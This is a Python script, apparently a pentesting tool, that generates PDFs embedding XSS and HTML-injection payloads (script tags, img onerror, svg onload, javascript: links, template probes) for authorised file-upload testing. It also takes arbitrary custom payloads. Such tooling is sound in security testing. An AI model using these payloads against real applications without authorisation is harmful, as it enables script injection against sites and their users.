#!/usr/bin/env python3

import argparse
from datetime import datetime
from fpdf import FPDF


def ask(prompt, default=""):
    value = input(f"{prompt} [{default}]: ").strip()
    return value if value else default


def build_pdf(output_file, client, message, mode, custom_payload=""):
    pdf = FPDF()
    pdf.add_page()

    pdf.set_font("Helvetica", "B", 18)
    pdf.cell(
        0,
        12,
        text="Web Application Security Test Document",
        new_x="LMARGIN",
        new_y="NEXT",
        align="C",
    )

    pdf.ln(10)
    pdf.set_font("Helvetica", "", 12)
    pdf.multi_cell(
        0,
        8,
        text=(
            f"Client: {client}\n"
            f"Assessment Type: File Upload Validation\n"
            f"Test Message: {message}\n"
            f"Payload Mode: {mode}\n"
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "This document was generated for authorised web application "
            "file upload and content rendering security testing."
        ),
    )

    payloads = {
        "1": f"""
=== EMBEDDED LINK TEST ===

<a href="javascript:alert('{client} - {message}')">
Click Me
</a>
""",
        "2": f"""
=== HTML INJECTION TEST ===

<h1>{client}</h1>
<p>{message}</p>
<b>{client} Security Assessment</b>
""",
        "3": f"""
=== IMAGE ONERROR XSS TEST ===

<img src=x onerror="alert('{client} - {message}')">
""",
        "4": f"""
=== SVG ONLOAD XSS TEST ===

<svg onload="alert('{client} - {message}')"></svg>
""",
        "5": f"""
=== SCRIPT TAG XSS TEST ===

<script>
alert('{client} - {message}');
</script>
""",
        "6": custom_payload,
        "7": f"""
=== COMMON PAYLOAD COLLECTION ===

Client: {client}
Message: {message}

<script>alert('{client}')</script>

<img src=x onerror=alert('{client}')>

<svg/onload=alert('{client}')>

<a href="javascript:alert('{client}')">Click Me</a>

<iframe src="javascript:alert('{client}')"></iframe>

{{{{7*7}}}}

${{7*7}}

{client} - Upload Validation Test
""",
    }

    selected_payload = payloads.get(mode, payloads["7"])

    pdf.add_page()
    pdf.set_font("Courier", "", 8)
    pdf.multi_cell(0, 5, text=selected_payload)

    pdf.add_page()
    pdf.set_font("Helvetica", "B", 14)
    pdf.cell(
        0,
        10,
        text="Assessment Reference",
        new_x="LMARGIN",
        new_y="NEXT",
    )

    pdf.set_font("Helvetica", "", 12)
    pdf.multi_cell(
        0,
        8,
        text=(
            f"Client: {client}\n"
            f"Reference: {client.upper().replace(' ', '-')}-UPLOAD-TEST-001\n\n"
            "If this content is rendered as HTML or JavaScript within the "
            "target application, it may indicate insufficient content "
            "sanitisation or unsafe file processing behaviour."
        ),
    )

    pdf.output(output_file)

    print(f"[+] PDF created successfully: {output_file}")
    print(f"[+] Client: {client}")
    print(f"[+] Message: {message}")


def interactive_mode():
    print("")
    print("PDF2XSS Payload Generator")
    print("========================")
    print("")
    print("1) Embedded JavaScript link")
    print("2) HTML injection payload")
    print("3) Image onerror XSS payload")
    print("4) SVG onload XSS payload")
    print("5) Script tag payload")
    print("6) Custom payload")
    print("7) Common payload collection")
    print("")

    mode = ask("Select payload type", "7")
    client = ask("Client name", "Example Ltd")
    message = ask("Alert/message text", "Stored XSS Validation Test")
    output_file = ask("Output PDF filename", "xss-test.pdf")

    custom_payload = ""
    if mode == "6":
        custom_payload = ask("Custom payload", f"<script>alert('{client}')</script>")

    build_pdf(output_file, client, message, mode, custom_payload)


def main():
    parser = argparse.ArgumentParser(
        description="Generate a PDF containing HTML/XSS test payloads for upload testing."
    )

    parser.add_argument("-f", "--file", help="Output PDF filename")
    parser.add_argument("-c", "--client", help="Client name")
    parser.add_argument("-m", "--message", help="Custom message")
    parser.add_argument(
        "-t",
        "--type",
        choices=["1", "2", "3", "4", "5", "6", "7"],
        help="Payload type: 1=link, 2=html, 3=img, 4=svg, 5=script, 6=custom, 7=common",
    )
    parser.add_argument("-p", "--payload", default="", help="Custom payload")

    args = parser.parse_args()

    if not any([args.file, args.client, args.message, args.type, args.payload]):
        interactive_mode()
        return

    build_pdf(
        output_file=args.file or "xss-test.pdf",
        client=args.client or "Example Ltd",
        message=args.message or "Stored XSS Validation Test",
        mode=args.type or "7",
        custom_payload=args.payload,
    )


if __name__ == "__main__":
    main()
